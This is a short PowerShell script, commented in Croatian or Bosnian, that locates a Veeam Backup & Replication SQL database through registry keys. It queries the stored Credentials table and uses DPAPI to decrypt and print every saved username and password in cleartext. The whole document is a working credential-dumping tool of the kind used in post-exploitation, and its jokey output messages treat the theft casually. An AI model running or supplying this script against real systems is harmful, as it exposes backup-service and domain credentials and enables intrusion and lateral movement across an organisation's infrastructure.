# skripta za extract Veeam passworda
Add-Type -Assembly System.Security

# Registry Paths
$VeaamRegPath1 = "HKLM:\SOFTWARE\Veeam\Veeam Backup and Replication\" # Veeam 10,11
$VeaamRegPath2 = "HKLM:\SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\MsSql\" # Veeam BR 12

$SqlDatabaseName = $null
$SqlInstanceName = $null
$SqlServerName = $null

# Konekcijski parametri
function Get-VeeamConnectionParameters($regPath) {
    try {
        $registryKey = Get-ItemProperty -Path $regPath -ErrorAction Stop
        $SqlDatabaseName = $registryKey.SqlDatabaseName 
        $SqlInstanceName = $registryKey.SqlInstanceName
        $SqlServerName = $registryKey.SqlServerName
        return $true, $SqlDatabaseName, $SqlInstanceName, $SqlServerName
    }
    catch {
        return $false, $null, $null, $null
    }
}

# Provjeri da li ima stari Veeam
$success, $SqlDatabaseName, $SqlInstanceName, $SqlServerName = Get-VeeamConnectionParameters -regPath $VeaamRegPath1

# Provjeri da li je novi Veeam u pitanju <12
if (-not $success) {
    $success, $SqlDatabaseName, $SqlInstanceName, $SqlServerName = Get-VeeamConnectionParameters -regPath $VeaamRegPath2
}


if (-not $success) {
    Write-Host "Nemogu provjeriti konekcijske parametre, runas li kao Admin?"
    
}

# Display information about the Veeam connection
Write-Host ""
Write-Host "Veeam pronajden $($SqlServerName) \$($SqlInstanceName)@$($SqlDatabaseName), spajanje..."

#Konekcija
$SQL = "SELECT [user_name] AS 'User name',[password] AS 'Password' FROM [$SqlDatabaseName].[dbo].[Credentials] "+
	"WHERE password <> ''" 
$auth = "Integrated Security=SSPI;"
$connectionString = "Provider=sqloledb; Data Source=$SqlServerName\$SqlInstanceName; " +
"Initial Catalog=$SqlDatabaseName; $auth; "
$connection = New-Object System.Data.OleDb.OleDbConnection $connectionString
$command = New-Object System.Data.OleDb.OleDbCommand $SQL, $connection


try {
	$connection.Open()
	$adapter = New-Object System.Data.OleDb.OleDbDataAdapter $command
	$dataset = New-Object System.Data.DataSet
	[void] $adapter.Fill($dataSet)
	$connection.Close()
}
catch {
	"Conn to DB failed, RIP"
	exit -1
}

"OK"

$rows=($dataset.Tables | Select-Object -Expand Rows)
if ($rows.count -eq 0) {
	"Nista od password-a."
	exit
}

""
"Passwords mmmm:"


$rows | ForEach-Object -Process {
	$EnryptedPWD = [Convert]::FromBase64String($_.password)
	$ClearPWD = [System.Security.Cryptography.ProtectedData]::Unprotect( $EnryptedPWD, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine )
	$enc = [system.text.encoding]::Default
	$_.password = $enc.GetString($ClearPWD)
}
 
Write-Output $rows | FT | Out-string
